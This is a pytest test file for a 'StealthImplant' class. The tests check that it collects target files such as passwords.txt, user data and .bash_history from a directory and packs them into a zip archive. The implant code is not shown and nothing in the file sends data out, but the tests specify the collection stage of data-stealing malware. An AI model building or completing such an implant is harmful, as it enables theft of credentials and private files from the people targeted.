import pytest
from pathlib import Path
import zipfile
import os
from datetime import datetime
from tmp363 import StealthImplant
from io import BytesIO

@pytest.fixture
def test_dir(tmp_path):
    base = tmp_path / "test_data"
    base.mkdir()
    
    # target file
    (base / "passwords.txt").write_text("secret")
    (base / "users_data.txt").write_text("user1\nuser2")

    # nontarget file
    (base / "readme.md").write_text("test")

    # history
    (base / ".bash_history").write_text("ls -la")

    # non target dirs
    (base / "tmp").mkdir()
    (base / "tmp" / "cache.log").write_text("temp data")

    return base


def test_file_collection(test_dir):
    implant = StealthImplant(
        source=str(test_dir),
        target_files=["passwords.txt", "users_data.txt"],
        history_glob=".*_history",
        test=True
    )

    collected = implant.walk_dir()
    collected_names = {p.name for p in collected}

    assert len(collected) == 3
    assert "passwords.txt" in collected_names
    assert "users_data.txt" in  collected_names
    assert ".bash_history" in collected_names
    assert "cache.log" not in collected_names

def test_zip_creation(test_dir):
    implant = StealthImplant(
        source=str(test_dir),
        target_files=["passwords.txt", "users_data.txt"],
        history_glob=".*_history",
        test=True
    )

    zip_data = implant.create_zip(implant.walk_dir())

    with zipfile.ZipFile(BytesIO(zip_data)) as zf:
        zip_files = set(zf.namelist())

        assert f"{test_dir.name}/passwords.txt" in zip_files
        assert f"{test_dir.name}/users_data.txt" in zip_files
        assert f"{test_dir.name}/.bash_history" in zip_files
        assert zf.read(f"{test_dir.name}/passwords.txt") == b"secret"
        assert zf.read(f"{test_dir.name}/users_data.txt") == b"user1\nuser2"

def test_history_file_matching(test_dir):
    implant = StealthImplant(
        source = str(test_dir),
        history_glob=".*_history",
        test=True
    )
    collected = implant.walk_dir()
    assert len(collected) == 1
    assert collected[0].name == ".bash_history"

